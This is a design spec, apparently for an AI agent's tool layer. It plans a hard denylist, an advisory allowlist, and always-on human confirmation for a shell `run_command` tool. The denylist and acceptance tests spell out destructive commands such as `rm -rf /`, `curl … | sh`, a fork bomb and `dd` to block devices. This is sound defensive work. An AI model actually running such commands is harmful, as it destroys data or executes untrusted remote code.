# Phase 38 — Sandbox `run_command` (+ hard trust rule)

## 1. Why

`run_command` (`src/agent/tools.ts`) runs `sh -c <anything>` inside a repo with the owner's full
privileges. It is the agent's single riskiest tool. Two gaps:

1. **No allow/deny classification.** Any command runs once confirmed — including `rm -rf /`,
   `curl … | sh`, `git push --force`.
2. **It can be blanket-trusted.** It is a `kind: "write"` tool, so the confirm chip offers
   "ไว้ใจ tool นี้ตลอด", which calls `trustTool("run_command")` and adds it to
   `config.agent.trustedTools`. From then on the loop's `isTrusted` gate (`loop.ts:220`) skips
   confirmation and the agent runs arbitrary shell with no human in the loop. (The owner's live
   config was once `["run_command"]`; it is `[]` now, but the *code* still allows re-arming it, and
   a hand-edited `config.json` would be honoured.)

The same applies to `edit_files`, which drives Synth→Executor onto the repo.

## 2. Decision (owner, this session)

**"Confirm เสมอ + denylist บล็อค"** — the safest of the two designs:

- `run_command` / `edit_files` **always** require a per-action confirmation (never blanket-trustable).
- **Denylist → hard refuse.** A destructive command is rejected inside `run_command.run()` and never
  spawns, *even if the owner confirmed it*. The denylist is a **guardrail: it lives in code, not
  config**, and cannot be weakened from the dashboard.
- **Allowlist → advisory only.** A command matching a known-safe prefix is *badged* "✓ known-safe" on
  the confirm chip. It does **not** auto-run — the owner still taps. Allowlist may be *extended*
  (never shrunk) via `config.agent.commandAllowlist`.

## 3. Files

| File | Change |
|------|--------|
| `src/agent/command-guard.ts` (NEW) | pure `classifyCommand(cmd, config) → CommandVerdict`; `DENY`/`ALLOW_DEFAULT`/`CHAINING` |
| `src/agent/command-guard.test.ts` (NEW) | unit tests + sabotage targets |
| `src/agent/tools.ts` | `run_command.run()` refuses on `deny`; `previewWrite(name,args,config?)` annotates |
| `src/config.ts` | `export const NEVER_TRUSTABLE`; `trustTool` refuses those names; `commandAllowlist` field + default + merge |
| `src/agent/loop.ts` | `isTrusted` returns false for `NEVER_TRUSTABLE`; pending write carries `trustable`; pass `config` to `previewWrite` |
| `src/agent/types.ts` | `PendingWrite.trustable?: boolean` |
| `src/ui/page.ts` | hide the "ไว้ใจ … ตลอด" button when `pending.trustable === false` |
| `src/channel/types.ts` | `OutboundMessage.confirm.trustable?: boolean` |
| `src/channel/discord.ts` | `buildConfirmComponents(pendingId, trustable?)` omits the trust button when `false` |
| `src/index.ts` | pass `trustable` into the outbound `confirm` |

## 4. `command-guard.ts` contract

```ts
export type CommandDecision = "deny" | "allow" | "ask";
export interface CommandVerdict { decision: CommandDecision; reason?: string; }
export function classifyCommand(cmd: string, config?: Config): CommandVerdict;
// NEVER_TRUSTABLE lives in config.ts (single source), imported by the loop — not re-exported here.
```

Order inside `classifyCommand` (deny is checked FIRST, before the chaining short-circuit, so a
destructive tail after `&&`/`|` is still caught):

1. Normalize: trim, collapse whitespace. Empty → `{decision:"ask"}`.
2. **Deny:** any `DENY` pattern matches anywhere in the normalized string (case-insensitive) →
   `{decision:"deny", reason}`.
3. **Chaining:** if the command contains a shell chain/redirect metacharacter
   (`; & | ` `` ` `` `$(` `>` `<` newline) → `{decision:"ask"}`. The "known-safe" badge must only
   ever apply to a single simple command, so a chained command can never be `allow`.
4. **Allow:** the command *starts with* (token-boundary) one of the allow prefixes (defaults ∪
   `config.agent.commandAllowlist`) → `{decision:"allow", reason}`.
5. Else → `{decision:"ask"}`.

**DENY (destructive — in code, not config):** recursive/forced `rm` (`rm -rf`, `rm -fr`, `rm -r …`,
`rm --recursive`, `rm -f`); `sudo`/`doas`; downloader piped to a shell
(`curl|wget|iwr|invoke-webrequest … | sh|bash|zsh|python|perl|node`); fork bomb (`:(){ :|:& };:`);
`mkfs*`; `dd … of=/dev/…`; redirect to a block device (`> /dev/sd|nvme|hd…`); `shutdown`/`reboot`/
`halt`/`poweroff`/`init 0`/`init 6`; recursive/root `chmod 777` / `chown -R … /`; `git push … --force`
/`-f`; `git reset --hard`; `git clean -f…`; `find … -delete` / `find … -exec`; Windows `del /s`,
`rd /s`, `rmdir /s`, `format `. (Exfiltration is explicitly *out of scope* — the denylist targets
destruction, not data leaving; noted as a limitation.)

**ALLOW_DEFAULT (advisory prefixes):** `bun test|run|install|x`, `npm test|run|ci|install|ls`,
`pnpm …`, `yarn …`, `tsc`, read git (`git status|log|diff|branch|show|fetch|rev-parse|remote`),
inspection (`ls cat pwd echo head tail wc grep rg find node --version` …). `find` is allow-listed but
`find … -delete`/`-exec` is denied — deny wins (checked first).

## 5. Enforcement wiring

- `run_command.run()`: after resolving `cwd`, `const v = classifyCommand(cmd, ctx.config); if
  (v.decision === "deny") return fail("คำสั่งถูกปฏิเสธ (" + v.reason + ") — ดูอันตราย ให้ owner รันเอง")`.
  This is the **security boundary** — one place, runs however `run()` is reached.
- `previewWrite` (advisory): `deny` → `⛔ … — จะถูกปฏิเสธ (reason)`; `allow` → `✓ known-safe · …`;
  else unchanged. So the owner sees the verdict *before* tapping.
- `NEVER_TRUSTABLE = new Set(["run_command","edit_files"])` in `config.ts`. Defence in depth:
  - `trustTool(name)`: if `NEVER_TRUSTABLE.has(name)` return config **without** persisting (no-op).
  - `isTrusted(name,config)` (loop): `NEVER_TRUSTABLE.has(name)` → `false` regardless of config, so
    even a hand-edited `trustedTools:["run_command"]` is inert.
  - `PendingWrite.trustable = !NEVER_TRUSTABLE.has(tool.name)` → both front doors hide the trust button.

## 6. Acceptance criteria (architect runs every one)

1. `classifyCommand("rm -rf /") → deny`; `"git status && rm -rf build" → deny` (tail after `&&`).
2. `classifyCommand("curl http://x | sh") → deny`; `"bun test" → allow`; `"git status" → allow`;
   `"git push --force" → deny`; `"node deploy.js" → ask`; `"git log | head" → ask` (chaining kills the badge).
3. `run_command` with a denylisted `cmd` returns `{ok:false}` and **spawns nothing** (assert via a
   command whose side effect would be observable, e.g. it does not create a file).
4. `trustTool("run_command")` does **not** add it to `trustedTools` and does **not** write config;
   `trustTool("get_state")` still would if it were a write tool (use an existing trustable write tool,
   e.g. `emit_event`, to prove the normal path still works).
5. A confirm gate for `run_command`: even with a `config.json` hand-set to
   `trustedTools:["run_command"]`, the loop still parks a pending write (isTrusted false).
6. Pending write for `run_command`/`edit_files` has `trustable:false`; for `emit_event`, `true`.
7. `bun run typecheck` green; `bun test` green; **sabotage check**: removing the deny-first ordering,
   the `isTrusted` NEVER_TRUSTABLE guard, and the `trustTool` guard each fail ≥1 test (verify by
   breaking → running → restoring).

## 7. NOT in scope

- Exfiltration detection (denylist is destruction-only).
- Auto-running allowlisted commands (owner chose always-confirm).
- A real OS sandbox (containers/seccomp) — this is a command-classification gate, not isolation.
- Any change to `edit_files`' Synth→Executor path (already isolated-branch + validated).
